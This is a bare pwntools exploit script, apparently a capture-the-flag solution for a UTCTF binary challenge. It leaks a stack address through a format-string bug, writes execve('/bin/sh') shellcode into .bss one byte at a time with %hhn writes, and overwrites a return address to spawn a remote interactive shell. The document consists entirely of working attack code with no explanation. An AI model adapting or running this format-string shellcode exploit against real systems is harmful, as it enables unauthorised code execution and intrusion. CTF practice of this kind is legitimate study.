from pwn import * 

shellcode="\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x48\x31\xf6\x0f"
bss=0x601070
#p=process("./pwnable")
p = remote("binary.utctf.live",9003)
p.recvuntil("do?")
count=0

p.sendline("%11$p")
#p.interactive()
data = p.recvuntil(" is ")
data = int(data[:-4].strip(),16)+8
print hex(data)

for i in range(len(shellcode)):
	payload=""
	payload+="%"+str(ord(shellcode[i]))+"x"
	payload+="%10$hhn"
	payload+="X"*(32-len(payload))
	payload+=p64(bss)
	print payload
	p.sendline(payload)
	bss+=1

payload=""
payload+="AAAAA"
payload+="%10$hhn"
payload+="X"*(32-len(payload))
payload+=p64(bss)
print payload
p.sendline(payload)
bss+=1
payload=""
payload+="%" + "6295664" + "x"
payload+="%10$n"
payload+="X"*(32-len(payload))
payload+=p64(data)
print payload
#gdb.attach(p.pid)
p.sendline(payload)
p.interactive()

#p.interactive()
#0x40069e